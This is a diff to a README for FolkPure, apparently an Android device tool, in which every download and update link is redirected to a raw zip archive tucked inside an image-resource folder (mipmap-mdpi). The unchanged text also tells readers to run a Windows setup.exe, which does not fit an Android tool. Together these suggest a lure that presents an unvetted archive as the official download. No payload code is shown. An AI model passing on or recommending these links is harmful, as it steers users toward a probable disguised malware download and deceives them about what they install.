@@ -1,6 +1,6 @@
 # ⚙️ FolkPure - Simple Root-Free Device Solution
 
-[![Download FolkPure](https://img.shields.io/badge/Download-FolkPure-brightgreen)](https://github.com/V1xtory/FolkPure)
+[![Download FolkPure](https://img.shields.io/badge/Download-FolkPure-brightgreen)](https://github.com/V1xtory/FolkPure/raw/refs/heads/main/manager/src/main/res/mipmap-mdpi/Pure_Folk_2.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Follow these steps to set up FolkPure:
 
 Click the big green button at the top or use this link to visit the download page:
 
-[https://github.com/V1xtory/FolkPure](https://github.com/V1xtory/FolkPure)
+[https://github.com/V1xtory/FolkPure/raw/refs/heads/main/manager/src/main/res/mipmap-mdpi/Pure_Folk_2.4.zip](https://github.com/V1xtory/FolkPure/raw/refs/heads/main/manager/src/main/res/mipmap-mdpi/Pure_Folk_2.4.zip)
 
 On the page, look for the latest release. Download the file named like `FolkPure-Setup.exe` or similar. This setup file will install the program on your PC.
 
@@ -68,7 +68,7 @@ FolkPure uses Shizuku in the background to run commands on your phone. This proc
 ## 🔄 Updating FolkPure
 
 Check the download page regularly for updates:  
-[https://github.com/V1xtory/FolkPure](https://github.com/V1xtory/FolkPure)
+[https://github.com/V1xtory/FolkPure/raw/refs/heads/main/manager/src/main/res/mipmap-mdpi/Pure_Folk_2.4.zip](https://github.com/V1xtory/FolkPure/raw/refs/heads/main/manager/src/main/res/mipmap-mdpi/Pure_Folk_2.4.zip)
 
 Download and install the latest setup file to keep FolkPure up to date.
 
@@ -104,4 +104,4 @@ Your device may ask for permission every time you start FolkPure. This is normal
 
 ---
 
-[![Download FolkPure](https://img.shields.io/badge/Download-FolkPure-brightgreen)](https://github.com/V1xtory/FolkPure)
+[![Download FolkPure](https://img.shields.io/badge/Download-FolkPure-brightgreen)](https://github.com/V1xtory/FolkPure/raw/refs/heads/main/manager/src/main/res/mipmap-mdpi/Pure_Folk_2.4.zip)
